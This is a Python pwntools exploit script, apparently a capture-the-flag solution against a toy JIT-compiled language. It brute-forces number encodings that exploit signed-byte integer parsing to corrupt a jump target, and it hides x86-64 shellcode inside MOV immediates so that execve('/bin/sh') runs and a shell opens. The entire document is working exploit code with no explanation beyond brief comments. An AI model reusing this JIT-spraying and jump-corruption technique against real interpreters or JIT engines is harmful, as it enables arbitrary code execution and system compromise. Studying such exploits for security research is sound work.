# python3 gen_exploit.py
# cat exploit.txt - | make run  # will exec a shell
#
# With conforming assembly:
# * Put "/bin/sh" in jit.data (r12)
# * Put 0x3b in A (rax) and 0 in B (rbx)
# Place a corrupted jump to the middle of a MOV instruction
# Shellcode encoded withing MOV instructions:
# * push rax
# * push r12
# * pop rdi
# * push rbx
# * pop rsi
# * push rbx
# * pop rdx
# * pop rax
# * syscall

from pwn import *
from itertools import product

def parsed_int(b):
    i = 0
    for x in b:
        i *= 10
        if x >= 0x80:
            x = x - 256
        i += (x - 0x30)
        i %= (2**32)
    return i

def find_jump(instrno):
    alphabet = [b'\x30', b'\xd9\xa0']
    for repeat in range(1, 24):
        for combo in product(alphabet, repeat=repeat):
            n = b''.join(combo)
            x = ((parsed_int(n) - instrno) * 5 - 5) % 256
            if x < 0x80 and x % 5 == 1:
                print(hex(parsed_int(n)))
                print(hex(x))
                return n, x // 5
    return None

def get_n(b):
    modulo = 2 ** (8*len(b))
    b = b + b'\0' * (4 - len(b))
    wanted = u32(b)
    alphabet = [b'\x30', b'\xd9\xa0']
    for repeat in range(1, 24):
        for combo in product(alphabet, repeat=repeat):
            n = b''.join(combo)
            x = parsed_int(n + b'0' * 5) % modulo
            if wanted > x and wanted - x < 99999:
                diff = wanted - x
                n += f"{diff:05}".encode()
                return n
    return None

push_rax = asm('push rax', arch = 'amd64')
assert len(push_rax) == 1
push_rbx = asm('push rbx', arch = 'amd64')
assert len(push_rbx) == 1
pop_rdi = asm('pop rdi', arch = 'amd64')
assert len(pop_rdi) == 1
pop_rsi = asm('pop rsi', arch = 'amd64')
assert len(pop_rsi) == 1
pop_rdx = asm('pop rdx', arch = 'amd64')
assert len(pop_rdx) == 1
pop_rax = asm('pop rax', arch = 'amd64')
assert len(pop_rax) == 1
push_r12 = asm('push r12', arch = 'amd64')
assert len(push_r12) == 2
syscall = asm('syscall', arch = 'amd64')
assert len(syscall) == 2
nop = asm('nop', arch = 'amd64')
assert len(nop) == 1
xor_al = asm('xor al, 0', arch = 'amd64')
assert len(xor_al) == 2
xor_al = xor_al[0:1]

instructions = []
instructions.append(push_rax + push_r12 + xor_al)
instructions.append(pop_rdi + push_rbx + pop_rsi + xor_al)
instructions.append(push_rbx + pop_rdx + nop + xor_al)
instructions.append(pop_rax + syscall + nop)

instrno = 0
program = b''

program += b'MOV(A, '
program += get_n(b'/bin')
program += b')\n'
instrno += 1
program += b'STR(A, 0)\n'
instrno += 1

program += b'MOV(A, '
program += get_n(b'/sh\0')
program += b')\n'
instrno += 1
program += b'STR(A, 1)\n'
instrno += 1

program += b'MOV(A, 59)\n' 
instrno += 1
program += b'MOV(B, 0)\n'
instrno += 1

n, paddings = find_jump(instrno)

program += b'JMP('
program += n
program += b')\n'

for _ in range(paddings):
    program += b'ADD(A, 0)\n'

for instruction in instructions:
    assert len(instruction) == 4
    print("Instruction:", instruction.hex())
    n = get_n(instruction)
    assert p32(parsed_int(n)) == instruction
    program += b'MOV(A, '
    program += n
    program += b')\n'

program += b'RET()\n'
program += b'\n'

with open('exploit.txt', 'wb') as f:
    f.write(program)
